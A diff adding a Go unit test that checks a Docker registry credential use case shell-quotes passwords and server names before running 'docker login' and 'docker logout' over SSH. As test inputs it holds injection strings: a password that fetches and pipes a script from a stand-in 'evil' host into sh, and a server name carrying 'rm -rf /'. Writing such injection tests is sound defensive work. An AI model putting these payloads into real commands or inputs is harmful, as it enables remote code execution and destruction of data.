@@ -60,3 +60,34 @@ func TestManageRegistryAuthUseCase_Delete(t *testing.T) {
 		t.Errorf("expected 0 credentials after delete, got %d", len(list))
 	}
 }
+
+// TestManageRegistryAuthUseCase_ShellInjectionPrevention valida el flujo completo de
+// Save/Delete con un ejecutor SSH real (mock): una contraseña/usuario/servidor con
+// comillas o metacaracteres de shell debe llegar citado al comando "docker login/logout".
+func TestManageRegistryAuthUseCase_ShellInjectionPrevention(t *testing.T) {
+	repo := mocks.NewMockConfigRepository()
+	mockSSH := mocks.NewMockSSHExecutor()
+	uc := NewManageRegistryAuthUseCase(repo, mockSSH)
+	config := domain.ServerConfig{Host: "127.0.0.1"}
+
+	cred := domain.SavedRegistryCredential{
+		Server:   "docker.io",
+		Username: "user",
+		Password: `x' ; curl http://evil/sh|sh #`,
+	}
+	if err := uc.Save(cred, config); err != nil {
+		t.Fatalf("unexpected error saving registry credential: %v", err)
+	}
+	wantLogin := `docker login 'docker.io' -u 'user' -p 'x'\'' ; curl http://evil/sh|sh #'`
+	if got := mockSSH.CommandsExecuted[len(mockSSH.CommandsExecuted)-1]; got != wantLogin {
+		t.Errorf("comando de login inseguro:\n got:  %s\n want: %s", got, wantLogin)
+	}
+
+	if err := uc.Delete("docker.io; rm -rf /", config); err != nil {
+		t.Fatalf("unexpected error deleting: %v", err)
+	}
+	wantLogout := `docker logout 'docker.io; rm -rf /' || true`
+	if got := mockSSH.CommandsExecuted[len(mockSSH.CommandsExecuted)-1]; got != wantLogout {
+		t.Errorf("comando de logout inseguro:\n got:  %s\n want: %s", got, wantLogout)
+	}
+}
